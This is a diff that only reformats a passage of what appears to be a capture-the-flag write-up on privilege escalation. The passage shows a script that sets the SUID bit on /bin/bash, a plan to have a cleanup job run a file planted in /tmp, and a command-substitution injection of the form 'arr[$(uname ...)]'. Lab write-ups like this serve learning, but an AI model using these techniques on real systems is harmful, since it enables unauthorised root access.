@@ -426,10 +426,11 @@ arr[$(uname -n -s -m -o)]
 Instead of running command as above  i will create a file which executes a `suid` binary of `bash` and name it as `hash.sh`
 ```
 www-data@interface:~$ cat > hash.sh <<EOF                                                                                                                            
-#!/bin/bash                                                                                                                                                        
- chmod u+s /bin/bash                                                                                                                                                
- EOF
- www-data@interface:~$
+#!/bin/bash
+
+chmod u+s /bin/bash
+EOF
+www-data@interface:~$
 ```
 Now i will create a file in `/tmp` directory because the cleaning script cleans files that are in `/tmp` also i will add  metadata by using `exiftool` 
 ```
